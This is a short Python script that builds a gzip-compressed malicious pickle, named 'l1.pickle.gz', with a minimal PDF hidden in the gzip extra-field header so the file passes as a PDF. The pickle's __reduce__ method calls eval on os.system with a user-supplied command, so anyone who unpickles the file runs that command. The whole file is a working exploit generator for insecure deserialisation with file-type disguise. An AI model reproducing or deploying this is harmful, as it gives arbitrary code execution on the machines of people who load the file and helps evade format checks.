import struct, zlib, binascii, pickle
from pdf_minimal import build_pdf_mini

def gzip_fextra(args):
    if args.payload == None:
        print("Please provide '--payload' parameter")
        exit()
    pdf_bytes = build_pdf_mini()
    payload_contents = gzip_payload(args.payload)
    content = build_gzip_header(pdf_bytes, payload_contents)
    open("l1.pickle.gz", "wb").write(content)

def build_gzip_header(extra: bytes, blocks: bytes) -> bytes:
    header = bytes([0x1f, 0x8b, 8, 0x04]) + struct.pack("<I", 0) + bytes([0, 255])
    if len(extra) > 65535:
         raise ValueError("FEXTRA >65535")
    header += struct.pack("<H", len(extra))
    header += extra
    comp = zlib.compressobj(level=9, wbits=-15)
    compress = comp.compress(blocks) + comp.flush()
    crc32 = binascii.crc32(blocks) & 0xffffffff
    isize = len(blocks) & 0xffffffff
    trailer = struct.pack("<II", crc32, isize)
    return header + compress + trailer

def gzip_payload(payl):
    class payload:
        def __reduce__(self):
            return (eval, (f"__import__('os').system({payl!r})",))
    return pickle.dumps(payload())